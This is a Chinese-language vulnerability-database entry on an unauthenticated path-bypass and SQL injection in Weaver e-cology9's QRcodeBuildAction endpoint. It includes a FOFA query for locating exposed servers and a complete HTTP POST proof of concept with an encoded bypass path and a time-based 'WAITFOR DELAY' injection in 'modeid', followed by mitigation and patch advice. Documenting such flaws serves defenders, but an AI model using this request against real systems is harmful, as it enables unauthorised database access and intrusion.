---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "泛微e-cology9 QRcodeBuildAction路径鉴权绕过+SQL注入"
product: "泛微e-cology9"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无具体版本；修复声称>=10.70；SQL Server"
prerequisites: "声称未认证，多重编码路径"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AEE-Cology9%20QRcodeBuildAction%20%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E5%AF%BC%E8%87%B4SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"泛微-OA（e-cology）\""
id: "vw-7617f12f934c7350e7954cfb"
entity_id: "ve-7617f12f934c7350e7954cfb"
schema_version: "1"
---

# 泛微e-cology9 QRcodeBuildAction路径鉴权绕过+SQL注入

## 条目说明

- 对象与具体问题：泛微e-cology9；QRcodeBuildAction路径鉴权绕过+SQL注入
- 版本、配置及部署条件：无具体版本；修复声称>=10.70；SQL Server
- 认证与权限前提：声称未认证，多重编码路径
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 与FileDownloadLocation共用路径绕过形态但SQL参数modeid不同，应区分实体
- 影响版本误带weaver词尾；servelt拼写需保留原接口并确认不要自动纠正URL
- 3万资产/在野利用无证据，HTTP缺围栏

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 漏洞描述

由于泛微E-Cology9 weaver.formmode.servelt.QRcodeBuildAction接口未对用户传入的数据进行严格的校验和过滤，导致攻击者利用多层编码的方式绕过身份认证进行SQL注入，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## 影响版本

泛微E-Cology9 weaver

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 严重 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：app="泛微-OA（e-cology）"

POC/EXP：

```http
POST /weaver/weaver.formmode.servelt.QRcodeBuildAction/login/LoginSSO.%25%36%61%25%37%33%25%37%30 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close

modeid=127+WAITFOR+DELAY+'0%3a0%3a5'
```


![image-20241105215753794](./.resource/泛微E-Cology9QRcodeBuildAction身份认证绕过导致SQL注入漏洞/media/image-20241105215753794.png)


![image-20241105215815985](./.resource/泛微E-Cology9QRcodeBuildAction身份认证绕过导致SQL注入漏洞/media/image-20241105215815985.png)


影响资产独立ip3w

![image-20241105215923939](./.resource/泛微E-Cology9QRcodeBuildAction身份认证绕过导致SQL注入漏洞/media/image-20241105215923939.png)


## 修复方案

临时缓解方案

限制访问来源地址，如非必要，不要将系统开放在互联网上。

升级修复方案

目前官方已发布安全补丁，建议受影响用户尽快升级至10.70及以上版本。

https://www.weaver.com.cn/cs/securityDownload.asp#


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
